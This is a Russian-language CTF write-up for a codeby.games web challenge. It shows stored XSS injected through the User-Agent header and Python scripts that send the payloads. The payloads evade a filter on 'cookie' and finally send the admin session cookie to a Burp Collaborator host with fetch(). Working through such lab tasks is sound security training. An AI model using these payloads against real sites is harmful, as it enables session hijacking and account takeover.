# [Запретный код (WEB)](https://codeby.games/categories/web/0a4fbe80-a801-4b1e-9cff-2cc4ef82e71c)

**level**: **Hard**

**Description**: Воображение важнее, чем знания

## Решение

Первое что видим в самом таске - форма логин/регистрации
Пробуем создать аккаунт и в дальнешем нужно получить админскую учётку.
Посмотрим на наличие подсказок в html и увидим вот такую подсказку.

<!-- Send Post request with parameter newpassword .... -->

Отлично, какой-то скрытый функционал, позже мы к нему вернемся.
Исследуем далее.

Попробуем использовать XSS
`XSS, или межсайтовый скриптинг, — это тип атаки на веб-приложения, при котором злоумышленник может внедрять в содержимое веб-страницы вредоносный скрипт, который будет выполняться на стороне клиента. Это может привести к краже данных, сессий или даже полному контролю над учетной записью жертвы. Рассмотрим возможные пути кражи аккаунта через XSS и методологию предотвращения таких атак.`

```javascript
<script>alert(1)</script>
```

Введя данную строчку увидим, что XSS-уязвимость есть, это нам поможет захватить аккаунт пользователя запустив на нем javascript код.

Но изменить имя admin на пейлоад нельзя, но не будем забывать что есть еще другие поля, которые тоже скорее всего подвержены XSS-атаке.
На поле id, username, IP, Date мы повлиять не можем, они генерируются на сервере, а вот на User-Agent запросто!

Для этого напишем скрипт на python, он нам очень пригодится в будущем.

## Проведение атаки

```python
import requests

payload = "<script>alert(1);</script>"

user = "asdf" #UserName
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data) # Совершаем попытку логина с неверным паролем

print(response.status_code)
```

Отлично, у нас получилось внедрить свой payload!

### Возможные пути кражи аккаунта через XSS:

1. **Кража cookies**: Скрипт может быть направлен на чтение cookies браузера пользователя, включая сессионные токены, которые затем отправляются злоумышленнику. Используя эти данные, злоумышленник может подделать сессию пользователя и получить доступ к его аккаунту.
2. **Phishing**: Вредоносный скрипт может перенаправить пользователя на поддельную страницу входа, где жертва, не подозревая обмана, введет свои учетные данные, которые будут перехвачены злоумышленником.
3. **Манипуляции с DOM**: Злоумышленник может изменять содержимое веб-страницы в реальном времени, вставляя вредоносные формы или изменяя существующие, чтобы перехватывать данные, вводимые пользователем.
4. **Кража токенов аутентификации**: Многие веб-приложения используют токены для подтверждения действий пользователя. XSS может быть использован для кражи этих токенов, позволяя злоумышленнику выполнять действия от имени пользователя.

## Атакуем тачку

Для реализации потребуется `Burp Suite Pro`.
Только в PRO версии есть `Collaborator`, которого нет в бесплатной версии.
Гугл в помощь для поиска версии PRO :D

Пробуем захватить document.cookie **значение**.

Используем простой alert();

```python
import requests


payload = '<script>alert(document.cookie);</script>'

user = "asdf"
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)

print(response.status_code)
print(response.text)
```

И сталкиваемся с проблемой...
Все отработало, но вот alert'a нет. А это все потому, автор данного решил добавить фильрацию на стороне сервера.

### Обход фильтрации

Обходим с помощью переменных.
Необязательно передовать слово cookie именно как слово, можно его собрать из массива.

```javascript
const vv = ["coo", "kie"].join("");
alert(document[vv]);
```

Напишем такой payload.

```python
import requests


payload = '<script>const vv = ["coo", "kie"].join("");alert(document[vv]);</script>'

user = "asdf"
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)

print(response.status_code)
print(response.text)
```

**Отлично**!
Вспоминаем зачем нам потребовался коллаборатор в бурпе.
Данное значение, которое только вывели в alert, мы будем ловить на его **сервер**.

1. Переходим в вкладку **Collaborator**
2. Нажимаем **Copy to clipboard**
3. Переходим по ней в google
4. Нажимаем **Poll now**, чтобы получить с сервера данные.
5. Если окошко снизу не появляется, то нажмите на "+. Это создаст новую сессию и обновит окошко.

Эта функция заменит нам ngrok или свой белый IP и сервер, очень удобно!

Далее копируем и вставляем в скрипт.

```python
import requests


payload = '<script>const vv = ["coo", "kie"].join(""); var payload = `https://{{СЮДА}}/?${vv}=` + document[vv]; fetch(payload);</script>'

user = "admin"
headers = {'User-Agent': payload}
data = {"username":user, "password":"aboba"}


response = requests.post('http://62.173.140.174:16035/login.php', headers=headers, data=data)

print(response.status_code)
print(response.text)
```

Отправляем, ждем, пуллим...
Вуаля! Подставим значение PHPSESSID в наш браузер при помощи [Cookie-Editor](https://github.com/Moustachauve/cookie-editor)
И получаем флаг :)
